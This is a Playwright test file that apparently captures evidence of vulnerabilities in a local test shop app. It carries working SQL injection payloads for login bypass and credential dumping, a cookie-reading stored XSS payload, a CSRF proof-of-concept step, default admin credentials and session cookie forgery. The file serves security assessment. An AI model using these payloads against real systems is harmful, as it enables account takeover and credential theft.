import { test, expect } from '@playwright/test';
import fs from 'fs';
import path from 'path';

const API = 'http://localhost:3000';
// screenshots/ at repo root (per D13 naming convention)
const SHOTS = path.resolve(process.cwd(), '../../screenshots');
const results: Record<string, string> = {};

test.describe('security evidence capture', () => {
  test('F01a login bypass via SQLi', async ({ page }) => {
    await page.goto('/login');
    // payload passes HTML5 email validation (no spaces before @) AND bypasses auth:
    // SQL becomes: WHERE email='x'/**/OR/**/1=1--@b.bb' AND password='x'
    await page.fill('input[type=email]', "x'/**/OR/**/1=1--@b.bb");
    await page.fill('input[type=password]', 'x');
    await page.click('button[type=submit]');
    await page.waitForURL('http://localhost:5173/');
    await page.waitForTimeout(1500);
    const stored = await page.evaluate(() => localStorage.getItem('user'));
    // bypass returns user id=1 (admin) stored in localStorage
    const loggedIn = !!stored && stored.includes('"role":"admin"');
    results['F01a_login_bypass'] = loggedIn ? 'logged-in-as-admin-id-1' : 'unknown';
    await page.screenshot({ path: `${SHOTS}/01a-login-sqli-bypass.png`, fullPage: true });
  });

  test('F01b UNION dump via search', async ({ page }) => {
    // product card renders name/category/price only, so concatenate creds into the name column
    const q = "' UNION SELECT NULL,email||' / '||password,NULL,NULL,role,NULL FROM users--";
    await page.goto('http://localhost:5173/products?q=' + encodeURIComponent(q));
    await page.waitForTimeout(3000);
    const body = await page.locator('body').innerText();
    results['F01b_union_dump'] =
      body.includes('admin@fashionhub.dev / admin123') ? 'creds-visible' : 'not-visible';
    await page.screenshot({ path: `${SHOTS}/01b-search-union-dump.png`, fullPage: true });
  });

  test('F01c verbose error disclosure via malformed search', async ({ page }) => {
    // a single quote breaks the SQL -> the API returns the raw Postgres error + stack trace (F04-3)
    // (the React UI hides it behind a generic message; the leak is at the API layer)
    await page.goto(`${API}/api/products?q='`);
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F04_verbose_error'] = body.includes('unterminated quoted string') || body.includes('at ')
      ? 'sql-error-and-stacktrace-exposed'
      : 'not-exposed';
    await page.screenshot({ path: `${SHOTS}/04c-verbose-error.png`, fullPage: true });
  });

  test('F02a stored XSS payload posted as public review', async ({ page }) => {
    // log out first: the review form is open to everyone by design (D8)
    await page.context().clearCookies();
    await page.goto('http://localhost:5173/products/1');
    await page.waitForTimeout(1500);
    const form = page.locator('form', { has: page.locator('input[name=author], input[placeholder*=author i], input[placeholder*=name i]') }).first();
    const hasForm = await form.count().then((c) => c > 0).catch(() => false);
    if (hasForm) {
      await form.locator('input').first().fill('mallory');
      const content = form.locator('textarea').first();
      await content.fill('<img src=x onerror="alert(document.cookie)">');
      await form.locator('button[type=submit]').first().click();
      await page.waitForTimeout(2000);
    }
    // verify the payload is stored raw via the API regardless of form automation
    const reviews = await (await request_fixture_get(`${API}/api/products/1/reviews`)).json();
    const storedRaw = JSON.stringify(reviews).includes('onerror');
    results['F02_xss_stored'] = storedRaw ? 'raw-html-stored' : 'sanitized';
    await page.screenshot({ path: `${SHOTS}/02a-xss-payload-posted.png`, fullPage: true });
  });

  test('F02b XSS fires in admin panel (session theft chain)', async ({ page }) => {
    // ensure the malicious review exists
    await request_fixture_post(`${API}/api/products/1/reviews`, {
      author: 'mallory',
      rating: 1,
      content: '<img src=x onerror="alert(document.cookie)">',
    });
    // log in as admin
    await page.goto('/login');
    await page.fill('input[type=email]', 'admin@fashionhub.dev');
    await page.fill('input[type=password]', 'admin123');
    await page.click('button[type=submit]');
    await page.waitForURL('http://localhost:5173/');
    // open the admin panel reviews tab -> payload renders via dangerouslySetInnerHTML
    let alertText = '';
    page.once('dialog', (dialog) => {
      alertText = dialog.message();
      dialog.dismiss();
    });
    await page.goto('/admin');
    await page.getByRole('button', { name: 'reviews' }).click();
    await page.waitForTimeout(2000);
    // allow a late dialog
    if (!alertText) {
      await page
        .waitForEvent('dialog', { timeout: 3000 })
        .then((d) => {
          alertText = d.message();
          return d.dismiss();
        })
        .catch(() => {});
    }
    results['F02_admin_xss'] = alertText.includes('session=')
      ? 'xss-fired-in-admin-session'
      : 'no-alert';
    await page.screenshot({ path: `${SHOTS}/02b-admin-xss-alert-cookie.png`, fullPage: true });
  });

  test('F03 CSRF via external PoC page', async ({ page, request }) => {
    // login as alice in the browser first
    await page.goto('/login');
    await page.fill('input[type=email]', 'alice@fashionhub.dev');
    await page.fill('input[type=password]', 'alice123');
    await page.click('button[type=submit]');
    await page.waitForTimeout(2000);

    // visit the attacker page (served locally) which auto-submits the CSRF form
    await page.goto('http://localhost:4444/csrf-poc.html');
    await page.waitForTimeout(1500);
    await page.screenshot({ path: `${SHOTS}/03a-csrf-poc-html.png`, fullPage: true });

    // verify the email actually changed (also persisted server-side)
    const apiEmail = await (await request.get(`${API}/api/profile`)).json().catch(() => null);
    await page.goto('/profile');
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F03_csrf_email_change'] =
      body.includes('hacked@evil.com') || (apiEmail && apiEmail.email === 'hacked@evil.com')
        ? 'email-changed'
        : 'not-changed';
    await page.screenshot({ path: `${SHOTS}/03b-email-changed-profile.png`, fullPage: true });
  });

  test('F04a default credentials grant admin', async ({ page }) => {
    await page.goto('/login');
    await page.fill('input[type=email]', 'admin@fashionhub.dev');
    await page.fill('input[type=password]', 'admin123');
    await page.click('button[type=submit]');
    await page.waitForURL('http://localhost:5173/');
    await page.goto('/admin');
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F04_default_creds'] = body.includes('Admin Panel') ? 'admin-via-default-creds' : 'denied';
    await page.screenshot({ path: `${SHOTS}/04a-default-creds-admin.png`, fullPage: true });
  });

  test('F04d missing security headers on API response', async ({ request }) => {
    const res = await request.get(`${API}/api/products`);
    const headers = res.headers();
    const missing = ['content-security-policy', 'x-frame-options', 'strict-transport-security'].filter(
      (h) => !(h in headers)
    );
    const poweredBy = 'x-powered-by' in headers;
    results['F04_security_headers'] =
      missing.length === 3 ? `missing-all${poweredBy ? '+x-powered-by' : ''}` : `partial-${missing.join(',')}`;
    await page_fixture_screenshot_headers(`${SHOTS}/04d-missing-headers-devtools.png`, res);
  });

  test('F04e cookie flags readable via document.cookie', async ({ page }) => {
    await page.goto('/login');
    await page.fill('input[type=email]', 'alice@fashionhub.dev');
    await page.fill('input[type=password]', 'alice123');
    await page.click('button[type=submit]');
    await page.waitForTimeout(2000);
    const cookie = await page.evaluate(() => document.cookie);
    results['F04_cookie_flags'] = cookie.includes('session=')
      ? 'js-readable-no-httponly'
      : 'not-readable';
    await page.screenshot({ path: `${SHOTS}/04e-cookie-flags-devtools.png`, fullPage: true });
  });

  test('F04 session forgery: cookie=1 grants admin', async ({ page }) => {
    await page.context().addCookies([
      { name: 'session', value: '1', domain: 'localhost', path: '/', secure: true, sameSite: 'None' },
    ]);
    await page.goto('/admin');
    await page.waitForTimeout(1500);
    const body = await page.locator('body').innerText();
    results['F04_session_forgery'] = body.includes('Admin Panel') ? 'admin-access-granted' : 'denied';
    await page.screenshot({ path: `${SHOTS}/04f-session-forgery.png`, fullPage: true });
  });

  test.afterAll(async () => {
    fs.writeFileSync(`${SHOTS}/evidence-summary.json`, JSON.stringify(results, null, 2));
    console.log('EVIDENCE SUMMARY:', JSON.stringify(results, null, 2));
  });
});

// small helpers so request fixtures work inside helper functions
import { request as pwRequest } from '@playwright/test';
async function request_fixture_get(url: string) {
  const ctx = await pwRequest.newContext();
  const res = await ctx.get(url);
  ctx.dispose();
  return res;
}
async function request_fixture_post(url: string, data: unknown) {
  const ctx = await pwRequest.newContext();
  const res = await ctx.post(url, { data });
  ctx.dispose();
  return res;
}
async function page_fixture_screenshot_headers(path: string, res: { headers(): Record<string, string> }) {
  // render the observed response headers into a PNG via a data URL page
  const { chromium } = await import('@playwright/test');
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const rows = Object.entries(res.headers())
    .map(([k, v]) => `<tr><td>${k}</td><td>${String(v).slice(0, 60)}</td></tr>`)
    .join('');
  await page.setContent(
    `<h2>GET /api/products — Response Headers</h2><table border=1 cellpadding=6>${rows}</table>`
  );
  await page.screenshot({ path, fullPage: true });
  await browser.close();
}
